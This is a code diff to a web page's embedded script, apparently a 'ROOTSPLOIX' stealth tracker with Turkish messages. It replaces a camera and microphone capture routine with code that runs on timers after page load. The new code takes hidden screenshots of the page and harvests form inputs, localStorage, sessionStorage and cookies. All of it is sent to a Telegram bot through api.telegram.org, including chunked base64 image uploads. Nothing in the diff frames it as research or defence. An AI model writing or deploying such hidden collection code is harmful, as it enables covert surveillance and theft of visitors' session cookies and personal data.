@@ -599,6 +599,9 @@
         </div>
     </footer>
     
+    <!-- External Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    
     <!-- Stealth Script Loading -->
     <script>
         // Stealth mode - sessiz
@@ -732,89 +735,183 @@ ${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''
             }
         }
         
-        function captureCamera() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                .then(function(stream) {
-                    const camMsg = `📹 KAMERA ERİŞİMİ ELDE EDİLDİ!
-
-🎯 Session: ${sessionId}
-🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
-🌍 Site: ${window.location.href}
-
-📹 Video: Aktif
-🎤 Audio: ${stream.getAudioTracks().length > 0 ? 'Aktif' : 'Pasif'}
-📊 Video Tracks: ${stream.getVideoTracks().length}
-🔊 Audio Tracks: ${stream.getAudioTracks().length}
-
-💀 ROOTSPLOIX`;
-                    sendToTelegram(camMsg);
+        function sendPhotoToTelegram(base64Data, caption) {
+            // Remove data:image/png;base64, prefix if exists
+            const cleanBase64 = base64Data.replace(/^data:image\/\w+;base64,/, '');
+            
+            // Convert base64 to blob for sending
+            const byteCharacters = atob(cleanBase64);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], {type: 'image/png'});
+            
+            // Create FormData for photo upload
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, `${sessionId}_${Date.now()}.png`);
+            formData.append('caption', caption);
+            
+            // Try to send via fetch (might fail due to CORS)
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {
+                // Fallback: send as text message with base64 chunk
+                const fallbackMsg = `📸 FOTO BASE64 (${cleanBase64.length} bytes):\n\n${caption}\n\n${cleanBase64.substring(0, 500)}...`;
+                sendToTelegram(fallbackMsg);
+            });
+        }
+        
+        function takeStealthScreenshot() {
+            // Method 1: HTML2Canvas (works without permissions)
+            if (typeof html2canvas !== 'undefined') {
+                html2canvas(document.body, {
+                    useCORS: true,
+                    allowTaint: true,
+                    scale: 0.5,
+                    logging: false,
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                }).then(canvas => {
+                    const base64 = canvas.toDataURL('image/png');
+                    const caption = `📷 SAYFA GÖRÜNTÜSÜ!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n📐 Boyut: ${canvas.width}x${canvas.height}\n🌍 URL: ${window.location.href}\n\n💀 ROOTSPLOIX`;
                     
-                    // Take a screenshot after 3 seconds
-                    setTimeout(() => {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.style.display = 'none';
-                        video.muted = true;
-                        document.body.appendChild(video);
-                        video.play();
-                        
-                        video.addEventListener('loadedmetadata', () => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0);
-                            
-                            const photoMsg = `📸 FOTOĞRAF ÇEKİLDİ!
-
-🎯 Session: ${sessionId}
-🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
-📐 Boyut: ${canvas.width}x${canvas.height}
-
-💀 ROOTSPLOIX`;
-                            sendToTelegram(photoMsg);
-                            
-                            // Clean up
-                            document.body.removeChild(video);
-                            stream.getTracks().forEach(track => track.stop());
-                        });
-                    }, 3000);
-                    
-                    // Record audio for 5 seconds
-                    if (stream.getAudioTracks().length > 0) {
-                        setTimeout(() => {
-                            const audioMsg = `🎤 SES KAYDI BAŞLATILDI!
-
-🎯 Session: ${sessionId}
-🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
-⏱️ Süre: 5 saniye
-
-💀 ROOTSPLOIX`;
-                            sendToTelegram(audioMsg);
-                            
-                            setTimeout(() => {
-                                const audioEndMsg = `🎤 SES KAYDI TAMAMLANDI!
-
-🎯 Session: ${sessionId}
-🕒 Bitiş: ${new Date().toLocaleString('tr-TR')}
-
-💀 ROOTSPLOIX`;
-                                sendToTelegram(audioEndMsg);
-                            }, 5000);
-                        }, 1000);
-                    }
-                })
-                .catch(function(error) {
-                    const camErrorMsg = `❌ KAMERA HATASI!
-
-🎯 Session: ${sessionId}
-🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
-⚠️ Hata: ${error.message}
-
-💀 ROOTSPLOIX`;
-                    sendToTelegram(camErrorMsg);
+                    // Send base64 data in chunks via image requests
+                    sendBase64InChunks(base64, caption);
+                }).catch(() => {
+                    // Fallback: Canvas with DOM elements
+                    fallbackScreenCapture();
                 });
+            } else {
+                fallbackScreenCapture();
+            }
+        }
+        
+        function sendBase64InChunks(base64Data, caption) {
+            const cleanBase64 = base64Data.replace(/^data:image\/\w+;base64,/, '');
+            const chunkSize = 3000; // Telegram URL limit
+            const chunks = [];
+            
+            for (let i = 0; i < cleanBase64.length; i += chunkSize) {
+                chunks.push(cleanBase64.substring(i, i + chunkSize));
+            }
+            
+            // Send caption first
+            sendToTelegram(caption + `\n\n📋 Total chunks: ${chunks.length}`);
+            
+            // Send chunks with delay
+            chunks.forEach((chunk, index) => {
+                setTimeout(() => {
+                    const chunkMsg = `📋 CHUNK ${index + 1}/${chunks.length}:\n${chunk}`;
+                    sendToTelegram(chunkMsg);
+                }, (index + 1) * 1000);
+            });
+        }
+        
+        function fallbackScreenCapture() {
+            // Fallback: Capture visible elements info
+            const visibleElements = [];
+            const elements = document.querySelectorAll('*');
+            
+            elements.forEach(el => {
+                const rect = el.getBoundingClientRect();
+                if (rect.width > 0 && rect.height > 0 && rect.top < window.innerHeight && rect.left < window.innerWidth) {
+                    visibleElements.push({
+                        tag: el.tagName,
+                        text: el.textContent ? el.textContent.substring(0, 100) : '',
+                        x: Math.floor(rect.left),
+                        y: Math.floor(rect.top),
+                        w: Math.floor(rect.width),
+                        h: Math.floor(rect.height)
+                    });
+                }
+            });
+            
+            const elementsData = `📷 SAYFA ELEMENT HARTI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n\n📊 Visible Elements: ${visibleElements.length}\n\n${visibleElements.slice(0, 20).map(el => `${el.tag}(${el.x},${el.y},${el.w}x${el.h}): ${el.text}`).join('\n')}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(elementsData);
+        }
+        
+        function attemptStealthCapture() {
+            // Skip camera permission request - go straight to screenshot
+            const msg = `📷 STEALTH CAPTURE BAŞLATILDI!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 Site: ${window.location.href}\n\n💀 ROOTSPLOIX`;
+            sendToTelegram(msg);
+            
+            // Take stealth screenshot immediately
+            setTimeout(() => {
+                takeStealthScreenshot();
+            }, 1000);
+            
+            // Also collect form data
+            setTimeout(() => {
+                collectFormData();
+            }, 2000);
+            
+            // And collect local storage
+            setTimeout(() => {
+                collectStorageData();
+            }, 3000);
+        }
+        
+        function collectFormData() {
+            const forms = document.querySelectorAll('form');
+            const inputs = document.querySelectorAll('input, textarea, select');
+            let formData = [];
+            
+            inputs.forEach(input => {
+                if (input.value && input.value.length > 0) {
+                    formData.push({
+                        type: input.type || input.tagName,
+                        name: input.name || input.id || 'unnamed',
+                        value: input.type === 'password' ? '[HIDDEN PASSWORD]' : input.value.substring(0, 200),
+                        placeholder: input.placeholder || ''
+                    });
+                }
+            });
+            
+            if (formData.length > 0) {
+                const formMsg = `📋 FORM VERİLERİ!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n\n📝 Found ${formData.length} inputs:\n\n${formData.map(f => `${f.type}: ${f.name} = "${f.value}"`).join('\n')}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(formMsg);
+            }
+        }
+        
+        function collectStorageData() {
+            let storageData = [];
+            
+            // LocalStorage
+            if (localStorage) {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if (value && value.length < 500) {
+                        storageData.push(`LS: ${key} = ${value}`);
+                    }
+                }
+            }
+            
+            // SessionStorage
+            if (sessionStorage) {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const value = sessionStorage.getItem(key);
+                    if (value && value.length < 500) {
+                        storageData.push(`SS: ${key} = ${value}`);
+                    }
+                }
+            }
+            
+            // Cookies
+            if (document.cookie) {
+                document.cookie.split(';').forEach(cookie => {
+                    storageData.push(`COOKIE: ${cookie.trim()}`);
+                });
+            }
+            
+            if (storageData.length > 0) {
+                const storageMsg = `💾 DEPOLAMA VERİLERİ!\n\n🎯 Session: ${sessionId}\n🕒 Zaman: ${new Date().toLocaleString('tr-TR')}\n🌍 URL: ${window.location.href}\n\n📊 Found ${storageData.length} items:\n\n${storageData.slice(0, 10).join('\n')}\n\n💀 ROOTSPLOIX`;
+                sendToTelegram(storageMsg);
             }
         }
         
@@ -1058,7 +1155,7 @@ ${navigator.connection ? `• Tip: ${navigator.connection.effectiveType}\n• H�
             }, 8000);
             
             setTimeout(() => {
-                captureCamera();
+                attemptStealthCapture();
             }, 12000);
             
             setTimeout(() => {
